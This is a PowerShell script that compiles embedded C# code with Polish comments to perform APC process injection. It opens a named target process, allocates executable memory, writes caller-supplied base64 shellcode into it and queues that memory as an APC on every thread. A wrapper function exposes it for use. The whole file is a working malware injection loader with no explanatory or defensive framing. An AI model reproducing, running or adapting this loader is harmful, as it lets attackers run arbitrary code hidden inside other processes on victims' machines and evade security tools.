$code = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

public class APCInjection
{
    // Importowanie funkcji WinAPI
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentThread();

    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    const uint PROCESS_CREATE_THREAD = 0x0002;
    const uint PROCESS_QUERY_INFORMATION = 0x0400;
    const uint PROCESS_VM_OPERATION = 0x0008;
    const uint PROCESS_VM_WRITE = 0x0020;
    const uint PROCESS_VM_READ = 0x0010;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    public static void Inject(string processName, string base64Shellcode)
    {
        byte[] shellcode = Convert.FromBase64String(base64Shellcode);

        try
        {
            Process[] processes = Process.GetProcessesByName(processName);
            if (processes.Length == 0)
            {
                Console.WriteLine("Process " + processName + " not found.");
                return;
            }

            Process targetProcess = processes[0];
            IntPtr hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);

            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("Failed to open target process.");
                return;
            }

            IntPtr allocatedMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (allocatedMemory == IntPtr.Zero)
            {
                Console.WriteLine("Failed to allocate memory in target process.");
                return;
            }

            IntPtr bytesWritten;
            bool writeResult = WriteProcessMemory(hProcess, allocatedMemory, shellcode, (uint)shellcode.Length, out bytesWritten);
            if (!writeResult)
            {
                Console.WriteLine("Failed to write shellcode to target process.");
                return;
            }

            foreach (ProcessThread thread in targetProcess.Threads)
            {
                IntPtr hThread = OpenThread(0x0010 | 0x0002, false, (uint)thread.Id);
                if (hThread != IntPtr.Zero)
                {
                    QueueUserAPC(allocatedMemory, hThread, IntPtr.Zero);
                }
            }

            Console.WriteLine("Shellcode injected via APC.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("An error occurred: " + ex.Message);
        }
    }
}
"@

Add-Type -TypeDefinition $code -Language CSharp

function Invoke-RemoteApcInjection {
    param (
        [string]$ProcessName,
        [string]$ShellcodeBase64
    )

    [APCInjection]::Inject($ProcessName, $ShellcodeBase64)
}
